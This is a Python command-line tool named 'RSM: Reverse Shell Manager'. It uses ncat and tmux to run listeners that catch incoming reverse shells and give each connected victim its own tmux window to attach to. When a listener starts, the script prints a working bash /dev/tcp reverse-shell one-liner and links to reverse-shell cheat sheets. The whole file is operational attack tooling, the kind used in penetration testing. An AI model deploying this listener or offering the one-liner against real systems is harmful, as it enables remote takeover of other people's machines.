#!/usr/bin/env python3

import argparse
import subprocess
import os
import sys
import shutil
import re


def check_command_exists(command):
    if shutil.which(command) is None:
        print(f"error: command '{command}' does not exist", file=sys.stderr)
        sys.exit(1)


def check_port_valid(port):
    if not (0 < port < 65536):
        print("error: port is out of range", file=sys.stderr)
        sys.exit(1)


def check_no_rsm_at(port, RSM_TMUX_SOCK):
    session = f"rsm-{port}"
    try:
        output = subprocess.check_output(
            ['tmux', '-S', RSM_TMUX_SOCK, 'ls'], stderr=subprocess.DEVNULL, universal_newlines=True)
        if re.search(rf'^{session}:', output, re.MULTILINE):
            print(f"error: already listening on port {port}", file=sys.stderr)
            sys.exit(1)
    except subprocess.CalledProcessError:
        pass  # No sessions exist


def check_exist_rsm(RSM_TMUX_SOCK):
    try:
        output = subprocess.check_output(
            ['tmux', '-S', RSM_TMUX_SOCK, 'ls'], stderr=subprocess.DEVNULL, universal_newlines=True)
        sessions = re.findall(r'^rsm-\d+:', output, re.MULTILINE)
        if not sessions:
            print("error: nothing listening", file=sys.stderr)
            sys.exit(1)
    except subprocess.CalledProcessError:
        print("error: nothing listening", file=sys.stderr)
        sys.exit(1)


def check_exist_rsm_at(port, RSM_TMUX_SOCK):
    session = f"rsm-{port}"
    try:
        output = subprocess.check_output(
            ['tmux', '-S', RSM_TMUX_SOCK, 'ls'], stderr=subprocess.DEVNULL, universal_newlines=True)
        if not re.search(rf'^{session}:', output, re.MULTILINE):
            print(f"error: nothing listening on port {port}", file=sys.stderr)
            sys.exit(1)
    except subprocess.CalledProcessError:
        print(f"error: nothing listening on port {port}", file=sys.stderr)
        sys.exit(1)


def check_requirements():
    check_command_exists('tmux')
    check_command_exists('ncat')


def rsm_start(port, RSM_DIR, RSM_TMUX_SOCK, RSM_MAX_CONN, RSM_MAX_RECV, RSM_WITH, RSM_HOOK, RSM_NCAT_FLAGS, RSM_TMUX_FLAGS):
    check_requirements()
    check_port_valid(port)
    check_no_rsm_at(port, RSM_TMUX_SOCK)
    _start(port, RSM_DIR, RSM_TMUX_SOCK, RSM_MAX_CONN, RSM_MAX_RECV,
           RSM_WITH, RSM_HOOK, RSM_NCAT_FLAGS, RSM_TMUX_FLAGS)


def _start(port, RSM_DIR, RSM_TMUX_SOCK, RSM_MAX_CONN, RSM_MAX_RECV, RSM_WITH, RSM_HOOK, RSM_NCAT_FLAGS, RSM_TMUX_FLAGS):
    dir_path = os.path.join(RSM_DIR, str(port))
    session = f"rsm-{port}"
    os.makedirs(dir_path, exist_ok=True)
    env = os.environ.copy()
    env['RSM_WITH'] = RSM_WITH
    env['RSM_HOOK'] = RSM_HOOK

    if RSM_MAX_CONN > 0 and '-m' not in RSM_NCAT_FLAGS:
        RSM_NCAT_FLAGS += f" -m {RSM_MAX_CONN}"

    if RSM_MAX_RECV > 0:
        RSM_CAT = f"head -c {RSM_MAX_RECV * 1024 * 1024}"
    else:
        RSM_CAT = 'cat'

    tmux_command = [
        'tmux', '-S', RSM_TMUX_SOCK, 'new', '-s', session, '-n', 'listener'
    ] + RSM_TMUX_FLAGS.split()

    tmux_script = f"""
eval $RSM_WITH &
echo 'info: RSM will be listening on port {port}'
echo 'info: the simplest reverse shell command:'
echo '  $ bash -c "bash -i >& /dev/tcp/$HOST/$PORT 0<&1"'
echo 'info: reverse shell cheatsheets:'
echo '  * https://highon.coffee/blog/reverse-shell-cheat-sheet/'
echo '  * https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet'
echo '  * https://oscp.infosecsanyam.in/shells/reverse-shell-cheat-sheet'
echo
ncat {RSM_NCAT_FLAGS} -v -k -l {port} -c '
    IP=$NCAT_REMOTE_ADDR
    PORT=$NCAT_REMOTE_PORT
    REMOTE_ADDR=$IP:$PORT
    eval $RSM_HOOK
    NAME=client-${{REMOTE_ADDR}}-$(date +%Y.%m.%d-%H:%M:%S)
    tmux -S {RSM_TMUX_SOCK} new-window -t {session} -n $REMOTE_ADDR "
        echo $(date), connection from: $REMOTE_ADDR
        echo ________________________________________________________________
        until [[ -S {dir_path}/$NAME ]]; do sleep 0.1; done
        ncat -U {dir_path}/$NAME | {RSM_CAT}
    "
    ncat -lU {dir_path}/$NAME
    rm -f {dir_path}/$NAME
    ' || {{
        echo
        echo 'warning: window will be closed after 5 seconds'
        echo
        for i in 5 4 3 2 1; do
            echo -n $i
            sleep 1
        done
    }}
rm -rf {dir_path}
"""

    try:
        subprocess.run(tmux_command + ['bash', '-c', tmux_script], env=env)
    except Exception as e:
        print(f"Error starting tmux session: {e}", file=sys.stderr)
        sys.exit(1)


def rsm_list(RSM_TMUX_SOCK):
    check_requirements()
    check_exist_rsm(RSM_TMUX_SOCK)
    ports = _list_ports(RSM_TMUX_SOCK)
    print("Active RSM listeners:")
    for port in ports:
        print(f"- Port {port}")


def _list_sessions(RSM_TMUX_SOCK):
    try:
        output = subprocess.check_output(
            ['tmux', '-S', RSM_TMUX_SOCK, 'ls'], stderr=subprocess.DEVNULL, universal_newlines=True)
        sessions = re.findall(r'^rsm-\d+:', output, re.MULTILINE)
        return [s.rstrip(':') for s in sessions]
    except subprocess.CalledProcessError:
        return []


def _list_ports(RSM_TMUX_SOCK):
    sessions = _list_sessions(RSM_TMUX_SOCK)
    ports = [int(s.split('-')[1]) for s in sessions]
    return ports


def rsm_info(port, RSM_DIR, RSM_TMUX_SOCK):
    check_requirements()
    check_port_valid(port)
    check_exist_rsm_at(port, RSM_TMUX_SOCK)
    _info(port, RSM_DIR)


def _info(port, RSM_DIR):
    dir_path = os.path.join(RSM_DIR, str(port))
    print(f"Port {port}:")
    if os.path.exists(dir_path):
        entries = os.listdir(dir_path)
        for entry in entries:
            print(f"- {entry}")
    else:
        print("No information available.")


def rsm_info_all(RSM_DIR, RSM_TMUX_SOCK):
    check_requirements()
    check_exist_rsm(RSM_TMUX_SOCK)
    ports = _list_ports(RSM_TMUX_SOCK)
    for port in ports:
        _info(port, RSM_DIR)


def rsm_stop(port, RSM_DIR, RSM_TMUX_SOCK):
    check_requirements()
    check_port_valid(port)
    check_exist_rsm_at(port, RSM_TMUX_SOCK)
    _stop(port, RSM_DIR, RSM_TMUX_SOCK)


def rsm_stop_all(RSM_DIR, RSM_TMUX_SOCK):
    check_requirements()
    check_exist_rsm(RSM_TMUX_SOCK)
    ports = _list_ports(RSM_TMUX_SOCK)
    for port in ports:
        _stop(port, RSM_DIR, RSM_TMUX_SOCK)


def _stop(port, RSM_DIR, RSM_TMUX_SOCK):
    session = f"rsm-{port}"
    _clean(port, RSM_DIR, RSM_TMUX_SOCK)
    print(f"Killing {session}")
    subprocess.run(['tmux', '-S', RSM_TMUX_SOCK,
                   'kill-session', '-t', session])
    dir_path = os.path.join(RSM_DIR, str(port))
    shutil.rmtree(dir_path, ignore_errors=True)


def rsm_clean(port, RSM_DIR, RSM_TMUX_SOCK):
    check_requirements()
    check_port_valid(port)
    check_exist_rsm_at(port, RSM_TMUX_SOCK)
    _clean(port, RSM_DIR, RSM_TMUX_SOCK)


def rsm_clean_all(RSM_DIR, RSM_TMUX_SOCK):
    check_requirements()
    check_exist_rsm(RSM_TMUX_SOCK)
    ports = _list_ports(RSM_TMUX_SOCK)
    for port in ports:
        _clean(port, RSM_DIR, RSM_TMUX_SOCK)


def _clean(port, RSM_DIR, RSM_TMUX_SOCK):
    session = f"rsm-{port}"
    result = subprocess.run(['tmux', '-S', RSM_TMUX_SOCK, 'list-windows',
                            '-t', session], capture_output=True, text=True)
    windows = []
    for line in result.stdout.splitlines():
        if 'listener' not in line:
            window_id = line.split(':')[0]
            windows.append(window_id)
    for window_id in windows:
        print(f"Killing {session}:{window_id}")
        subprocess.run(['tmux', '-S', RSM_TMUX_SOCK,
                       'kill-window', '-t', f"{session}:{window_id}"])
    dir_path = os.path.join(RSM_DIR, str(port))
    for filename in os.listdir(dir_path):
        filepath = os.path.join(dir_path, filename)
        if os.path.isfile(filepath):
            os.remove(filepath)


def rsm_attach(port, RSM_TMUX_SOCK):
    check_requirements()
    check_port_valid(port)
    check_exist_rsm_at(port, RSM_TMUX_SOCK)
    _attach(port, RSM_TMUX_SOCK)


def rsm_attach_last(RSM_TMUX_SOCK):
    check_requirements()
    check_exist_rsm(RSM_TMUX_SOCK)
    ports = _list_ports(RSM_TMUX_SOCK)
    if not ports:
        print("No active sessions to attach to.", file=sys.stderr)
        sys.exit(1)
    port = ports[-1]
    _attach(port, RSM_TMUX_SOCK)


def _attach(port, RSM_TMUX_SOCK):
    session = f"rsm-{port}"
    subprocess.run(['tmux', '-S', RSM_TMUX_SOCK, 'attach', '-t', session])


def main():
    parser = argparse.ArgumentParser(description='RSM: Reverse Shell Manager')
    parser.add_argument('-d', '--dir', default='/tmp/.rsm',
                        help='Where the rsm sockets be stored (default: /tmp/.rsm)')
    parser.add_argument('-n', '--max-conn', type=int, default=128,
                        help='Maximum number of connections (default: 128)')
    parser.add_argument('-r', '--max-recv', type=int, default=0,
                        help='Maximum receiving MB (default: 0, unlimited)')
    parser.add_argument('-c', '--hook', default=':',
                        help='Command to eval when a client connects')
    parser.add_argument('-w', '--with', dest='with_cmd',
                        default=':', help='Command to eval when rsm starts')
    parser.add_argument('--ncat-flags', default='',
                        help='Additional command line flags for ncat')
    parser.add_argument('--tmux-flags', default='',
                        help='Additional command line flags for tmux')
    parser.add_argument('command', nargs='?', help='Command to execute')
    parser.add_argument('args', nargs='*', help='Arguments for the command')

    args = parser.parse_args()

    # Set up the global variables
    RSM_DIR = args.dir
    RSM_MAX_CONN = args.max_conn
    RSM_MAX_RECV = args.max_recv
    RSM_WITH = args.with_cmd
    RSM_HOOK = args.hook
    RSM_NCAT_FLAGS = args.ncat_flags
    RSM_TMUX_FLAGS = args.tmux_flags
    RSM_TMUX_SOCK = os.path.join(RSM_DIR, 'tmux.sock')

    os.makedirs(RSM_DIR, exist_ok=True)

    if args.command is None:
        print("Requires an argument.", file=sys.stderr)
        parser.print_help()
        sys.exit(1)

    command = args.command
    arguments = args.args

    if command in ['detached', 'de', 'd']:
        if len(arguments) != 1:
            print(f"error: command {
                  command} requires exactly one argument", file=sys.stderr)
            sys.exit(1)
        port = int(arguments[0])
        if '-d' not in RSM_TMUX_FLAGS:
            RSM_TMUX_FLAGS += ' -d'
        rsm_start(port, RSM_DIR, RSM_TMUX_SOCK, RSM_MAX_CONN, RSM_MAX_RECV,
                  RSM_WITH, RSM_HOOK, RSM_NCAT_FLAGS, RSM_TMUX_FLAGS)
    elif command in ['stop', 'st', 's']:
        if len(arguments) == 0:
            rsm_stop_all(RSM_DIR, RSM_TMUX_SOCK)
        elif len(arguments) == 1:
            port = int(arguments[0])
            rsm_stop(port, RSM_DIR, RSM_TMUX_SOCK)
        else:
            print(f"error: wrong number of arguments for command {
                  command}", file=sys.stderr)
            sys.exit(1)
    elif command in ['clean', 'cl', 'c']:
        if len(arguments) == 0:
            rsm_clean_all(RSM_DIR, RSM_TMUX_SOCK)
        elif len(arguments) == 1:
            port = int(arguments[0])
            rsm_clean(port, RSM_DIR, RSM_TMUX_SOCK)
        else:
            print(f"error: wrong number of arguments for command {
                  command}", file=sys.stderr)
            sys.exit(1)
    elif command in ['attach', 'at', 'a']:
        if len(arguments) == 0:
            rsm_attach_last(RSM_TMUX_SOCK)
        elif len(arguments) == 1:
            port = int(arguments[0])
            rsm_attach(port, RSM_TMUX_SOCK)
        else:
            print(f"error: wrong number of arguments for command {
                  command}", file=sys.stderr)
            sys.exit(1)
    elif command in ['list', 'ls', 'l']:
        rsm_list(RSM_TMUX_SOCK)
    elif command in ['info', 'i']:
        if len(arguments) == 0:
            rsm_info_all(RSM_DIR, RSM_TMUX_SOCK)
        elif len(arguments) == 1:
            port = int(arguments[0])
            rsm_info(port, RSM_DIR, RSM_TMUX_SOCK)
        else:
            print(f"error: wrong number of arguments for command {
                  command}", file=sys.stderr)
            sys.exit(1)
    elif command in ['help', 'h']:
        parser.print_help()
    else:
        # Assume command is port number
        try:
            port = int(command)
            if len(arguments) != 0:
                print(f"error: wrong number of arguments for command {
                      command}", file=sys.stderr)
                sys.exit(1)
            rsm_start(port, RSM_DIR, RSM_TMUX_SOCK, RSM_MAX_CONN, RSM_MAX_RECV,
                      RSM_WITH, RSM_HOOK, RSM_NCAT_FLAGS, RSM_TMUX_FLAGS)
        except ValueError:
            print(f"Unknown command: {command}", file=sys.stderr)
            sys.exit(1)


if __name__ == '__main__':
    main()
